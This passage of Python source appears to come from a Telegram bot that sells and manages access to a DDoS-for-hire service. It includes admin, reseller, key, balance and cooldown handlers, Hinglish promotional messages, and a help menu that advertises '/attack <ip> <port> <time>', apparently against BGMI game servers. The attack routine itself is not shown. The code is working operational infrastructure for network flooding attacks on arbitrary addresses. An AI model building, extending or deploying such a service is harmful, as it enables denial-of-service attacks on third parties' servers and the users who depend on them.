            f"Key block ho gaya, bhai! 🚫\n"
            f"<b><i>Key</i></b>: `{formatting.escape_markdown(key)}`\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Yeh key ab kaam nahi karega! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /listkeys dekh updated list! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/block", f"Key: {key}", response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["add"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /add <user_id> <duration> <context>\n"
                f"<b><i>Example</i></b>: /add 123456789 1d group 📋\n"
                f"<b><i>Durations</i></b>: 1min, 1h, 1d, 7d, 1m\n"
                f"<b><i>Contexts</i></b>: group, private"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    target_id, duration, context = command_parts[1], command_parts[2].lower(), command_parts[3].lower()
    if duration not in KEY_COST:
        response = format_response(
            header="COMMAND ERROR",
            body=f"Invalid duration! ❌\n<b><i>Durations</i></b>: 1min, 1h, 1d, 7d, 1m"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    if context not in ['group', 'private']:
        response = format_response(
            header="COMMAND ERROR",
            body=f"Invalid context! ❌\n<b><i>Contexts</i></b>: group, private"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    try:
        target_id = str(int(target_id))
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="User ID number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    target_username = "Unknown"
    try:
        chat = bot.get_chat(target_id)
        target_username = chat.username or chat.first_name or "Unknown"
    except:
        pass

    minutes, hours, days, months = parse_duration(duration)
    expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)

    authorized_users[target_id] = {
        "context": context,
        "expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'),
        "username": target_username
    }
    save_data()

    response = format_response(
        header="USER ADDED",
        body=(
            f"User add ho gaya, bhai! 🎉\n"
            f"<b><i>User ID</i></b>: {target_id}\n"
            f"<b><i>Username</i></b>: @{formatting.escape_markdown(target_username)}\n"
            f"<b><i>Duration</i></b>: {duration}\n"
            f"<b><i>Context</i></b>: {context.capitalize()}\n"
            f"<b><i>Expiration</i></b>: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Ab yeh user {context} mein attack kar sakta hai! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /users dekh list! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/add", f"Target ID: {target_id}, Username: {target_username}, Duration: {duration}, Context: {context}", response)

@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["logs"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    if not is_overlord(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", "", response)
        return

    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as file:
            logs = file.read()
        if not logs.strip():
            response = format_response(
                header="NO LOGS",
                body="Koi logs nahi hai, bhai! 😢\n\n<b><i>COSMIC INSIGHT</i></b>: System abhi fresh hai! 🚀"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/logs", "No logs available", response)
            return

        log_chunks = [logs[i:i+4000] for i in range(0, len(logs), 4000)]
        for i, chunk in enumerate(log_chunks):
            response = format_response(
                header=f"LOG VAULT {'(PART ' + str(i+1) + ')' if len(log_chunks) > 1 else ''}",
                body=f"```\n{formatting.escape_markdown(chunk)}\n```\n\n<b><i>COSMIC INSIGHT</i></b>: Yeh hai system ka pura hisaab! 📜"
            )
            safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", f"Logs sent, parts: {len(log_chunks)}", response)
    except Exception as e:
        response = format_response(
            header="LOG ERROR",
            body=f"Logs nahi dikh sake! 😢\n<b><i>Error</i></b>: {str(e)}\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 ko bol, issue fix karenge! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", "", response, str(e))

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["users"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/users", "", response)
        return

    if not users and not authorized_users:
        response = format_response(
            header="NO USERS",
            body="Koi active users nahi hai, bhai! 😢\n\n<b><i>COSMIC INSIGHT</i></b>: /add se users add kar! 🚀"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/users", "No users available", response)
        return

    user_list = []
    for uid, info in {**users, **authorized_users}.items():
        user_list.append(
            f"- <b><i>User ID</i></b>: {uid}\n"
            f"- <b><i>Username</i></b>: @{formatting.escape_markdown(info['username'])}\n"
            f"- <b><i>Context</i></b>: {info['context'].capitalize()}\n"
            f"- <b><i>Expiration</i></b>: {info['expiration']}\n"
        )

    response = format_response(
        header="USER VAULT",
        body=(
            f"Yeh hai sab users ka cosmic vault, bhai! 👥\n\n"
            f"{''.join(user_list)}\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Users ko /remove se hata sakte ho! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /stats dekh system ka report card! 📊"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/users", f"Users listed: {len(user_list)}", response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["remove"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /remove <user_id>\n"
                f"<b><i>Example</i></b>: /remove 123456789 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    target_id = command_parts[1]
    try:
        target_id = str(int(target_id))
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="User ID number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    target_username = "Unknown"
    if target_id in users:
        target_username = users[target_id]["username"]
        del users[target_id]
    elif target_id in authorized_users:
        target_username = authorized_users[target_id]["username"]
        del authorized_users[target_id]
    else:
        response = format_response(
            header="USER NOT FOUND",
            body=f"User ID {target_id} system mein nahi hai! 😢\n\n<b><i>COSMIC COMMAND</i></b>: /users dekh list! 📋"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Target ID: {target_id}", response)
        return

    save_data()
    response = format_response(
        header="USER REMOVED",
        body=(
            f"User remove ho gaya, bhai! 🗑️\n"
            f"<b><i>User ID</i></b>: {target_id}\n"
            f"<b><i>Username</i></b>: @{formatting.escape_markdown(target_username)}\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Yeh user ab attack nahi kar sakta! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /users dekh updated list! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/remove", f"Target ID: {target_id}, Username: {target_username}", response)

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["resellers"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/resellers", "", response)
        return

    if not resellers:
        response = format_response(
            header="NO RESELLERS",
            body="Koi resellers nahi hai, bhai! 😢\n\n<b><i>COSMIC INSIGHT</i></b>: /addreseller se reseller add kar! 🚀"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/resellers", "No resellers available", response)
        return

    reseller_list = []
    for rid, info in resellers.items():
        reseller_list.append(
            f"- <b><i>User ID</i></b>: {rid}\n"
            f"- <b><i>Username</i></b>: @{formatting.escape_markdown(info['username'])}\n"
            f"- <b><i>Balance</i></b>: {info['balance']} Rs\n"
        )

    response = format_response(
        header="RESELLER VAULT",
        body=(
            f"Yeh hai sab resellers ka cosmic vault, bhai! 💰\n\n"
            f"{''.join(reseller_list)}\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Resellers ko /removereseller se hata sakte ho! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /addreseller se naye reseller add kar! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/resellers", f"Resellers listed: {len(reseller_list)}", response)

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["removereseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /removereseller <user_id>\n"
                f"<b><i>Example</i></b>: /removereseller 123456789 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    target_id = command_parts[1]
    try:
        target_id = str(int(target_id))
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="User ID number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    if target_id not in resellers:
        response = format_response(
            header="RESELLER NOT FOUND",
            body=f"User ID {target_id} reseller nahi hai! 😢\n\n<b><i>COSMIC COMMAND</i></b>: /resellers dekh list! 📋"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Target ID: {target_id}", response)
        return

    target_username = resellers[target_id]["username"]
    del resellers[target_id]
    save_data()

    response = format_response(
        header="RESELLER REMOVED",
        body=(
            f"Reseller remove ho gaya, bhai! 🗑️\n"
            f"<b><i>User ID</i></b>: {target_id}\n"
            f"<b><i>Username</i></b>: @{formatting.escape_markdown(target_username)}\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Yeh reseller ab keys nahi bana sakta! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /resellers dekh updated list! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removereseller", f"Target ID: {target_id}, Username: {target_username}", response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["addbalance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /addbalance <user_id> <amount>\n"
                f"<b><i>Example</i></b>: /addbalance 123456789 1000 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    target_id = command_parts[1]
    try:
        amount = int(command_parts[2])
        if amount <= 0:
            response = format_response(
                header="COMMAND ERROR",
                body="Amount positive number hona chahiye! ❌"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addbalance", f"Command: {command}", response)
            return
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="Amount number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    try:
        target_id = str(int(target_id))
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="User ID number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    if target_id not in resellers:
        response = format_response(
            header="RESELLER NOT FOUND",
            body=f"User ID {target_id} reseller nahi hai! 😢\n\n<b><i>COSMIC COMMAND</i></b>: /addreseller se pehle reseller bana! 📋"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Target ID: {target_id}", response)
        return

    resellers[target_id]["balance"] += amount
    target_username = resellers[target_id]["username"]
    save_data()

    response = format_response(
        header="BALANCE ADDED",
        body=(
            f"Balance add ho gaya, bhai! 💰\n"
            f"<b><i>User ID</i></b>: {target_id}\n"
            f"<b><i>Username</i></b>: @{formatting.escape_markdown(target_username)}\n"
            f"<b><i>Added Amount</i></b>: {amount} Rs\n"
            f"<b><i>New Balance</i></b>: {resellers[target_id]['balance']} Rs\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Ab yeh reseller aur keys bana sakta hai! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /balance se check kar! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addbalance", f"Target ID: {target_id}, Username: {target_username}, Amount: {amount}, New Balance: {resellers[target_id]['balance']}", response)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["setcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /setcooldown <seconds>\n"
                f"<b><i>Example</i></b>: /setcooldown 300 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    try:
        seconds = int(command_parts[1])
        if seconds < 0:
            response = format_response(
                header="COMMAND ERROR",
                body="Cooldown negative nahi ho sakta! ❌"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
            return
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="Cooldown seconds mein number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    set_cooldown(seconds)
    response = format_response(
        header="COOLDOWN SET",
        body=(
            f"Cooldown set ho gaya, bhai! ⏳\n"
            f"<b><i>New Cooldown</i></b>: {seconds} seconds\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Ab har attack ke baad {seconds} seconds wait karna padega! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /checkcooldown se check kar! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/setcooldown", f"Cooldown: {seconds}", response)

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["checkcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    response = format_response(
        header="COOLDOWN STATUS",
        body=(
            f"Yeh hai current cooldown status, bhai! ⏳\n"
            f"<b><i>Cooldown</i></b>: {COOLDOWN_PERIOD} seconds\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Har attack ke baad itna wait karna padta hai! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /setcooldown se change kar sakta hai! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", f"Cooldown: {COOLDOWN_PERIOD}", response)

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["start"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    response = format_response(
        header="WELCOME TO COSMIC VAULT",
        body=(
            f"Welcome bhai, cosmic power tera intezaar kar rahi hai! 🌌\n"
            f"<b><i>User ID</i></b>: {user_id}\n"
            f"<b><i>Username</i></b>: @{formatting.escape_markdown(username)}\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Yeh bot tujhe ultimate attack power dega! 💥\n"
            f"<b><i>GET STARTED</i></b>:\n"
            f"1. Key kharid @Rahul_618 se 🔑\n"
            f"2. /redeem <key> se activate kar 🚀\n"
            f"3. /attack se dushman ko uda! 💪\n\n"
            f"<b><i>COSMIC COMMAND</i></b>: /help se pura menu dekh! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/start", "", response)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["help"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    response = format_response(
        header="COSMIC COMMAND CENTER",
        body=(
            f"Yeh hai pura command menu, bhai! 📜\n\n"
            f"<b><i>USER COMMANDS:</i></b>\n"
            f"🔹 /start - Bot shuru kar aur welcome message dekh\n"
            f"🔹 /help - Yeh menu dekh\n"
            f"🔹 /redeem <key> - Key activate kar\n"
            f"🔹 /myinfo - Apna profile dekh\n"
            f"🔹 /attack <ip> <port> <time> - Attack shuru kar\n"
            f"🔹 /checkcooldown - Current cooldown check kar\n\n"
            f"<b><i>RESELLER COMMANDS:</i></b>\n"
            f"🔸 /genkey <duration> <context> - Naya key bana\n"
            f"🔸 /balance - Apna reseller balance check kar\n\n"
            f"<b><i>ADMIN COMMANDS:</i></b>\n"
            f"🔧 /add <user_id> <duration> <context> - User add kar\n"
            f"🔧 /remove <user_id> - User hata\n"
            f"🔧 /users - Sab users ki list dekh\n"
            f"🔧 /listkeys - Sab keys ki list dekh\n"
            f"🔧 /block <key> - Key block kar\n"
            f"🔧 /addreseller <user_id> <balance> - Reseller add kar\pm"
            f"🔧 /removereseller <user_id> - Reseller hata\n"
            f"🔧 /addbalance <user_id> <amount> - Reseller ka balance add kar\n"
            f"🔧 /resellers - Sab resellers ki list dekh\n"
            f"🔧 /setcooldown <seconds> - Attack cooldown set kar\n\n"
            f"<b><i>OVERLORD COMMANDS:</i></b>\n"
            f"👑 /addadmin <username_or_id> - Admin add kar\n"
            f"👑 /removeadmin <username_or_id> - Admin hata\n"
            f"👑 /checkadmin - Admins aur Overlords ki list dekh\n"
            f"👑 /stats - System ka live report card dekh\n"
            f"👑 /logs - System logs dekh\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Key ke liye @Rahul_618 se baat kar! 💥\n"
            f"<b><i>FEEDBACK ZAROORI</i></b>: Group mein attack ke liye BGMI screenshot compulsory hai! 📸"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/help", "", response)

# Start the bot
if __name__ == "__main__":
    load_data()
    create_backup()
    print("Bot is running...")
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        log_error(f"Bot crashed: {str(e)}", "system", "system")
        print(f"Bot crashed: {str(e)}")
        time.sleep(5)
        bot.infinity_polling(none_stop=True)